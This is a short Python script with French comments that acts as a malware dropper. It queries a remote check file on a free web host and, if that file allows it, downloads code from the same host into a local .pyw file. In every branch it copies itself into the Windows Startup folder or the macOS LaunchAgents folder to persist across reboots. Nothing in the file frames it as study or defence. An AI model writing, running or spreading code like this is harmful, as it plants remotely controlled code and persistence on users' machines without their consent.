import requests
import os
import shutil
import platform
current_os = platform.system()
nom_script = __file__
try:
    verif = requests.get("https://cordiform-hoop.000webhostapp.com/verif.txt")
    verif = verif.text
    if verif == "yes":
        look = requests.get("https://cordiform-hoop.000webhostapp.com/test.txt")
        look = look.text
        nom_fichier = "test.pyw"
        with open(nom_fichier, 'w') as fichier:
            fichier.write(look)
        if current_os == 'Windows':
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif current_os == 'Darwin':  # 'Darwin' est la valeur renvoyée pour macOS
            startup_folder = os.path.expanduser('~/Library/LaunchAgents')
        else:
            print("Système d'exploitation non pris en charge.")
            exit()
        shutil.copy(nom_script, startup_folder)
    else :
        if current_os == 'Windows':
            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif current_os == 'Darwin':  # 'Darwin' est la valeur renvoyée pour macOS
            startup_folder = os.path.expanduser('~/Library/LaunchAgents')
        else:
            print("Système d'exploitation non pris en charge.")
            exit()
        shutil.copy(nom_script, startup_folder)
except:
    if current_os == 'Windows':
        startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif current_os == 'Darwin':  # 'Darwin' est la valeur renvoyée pour macOS
        startup_folder = os.path.expanduser('~/Library/LaunchAgents')
    else:
        print("Système d'exploitation non pris en charge.")
        exit()
    shutil.copy(nom_script, startup_folder)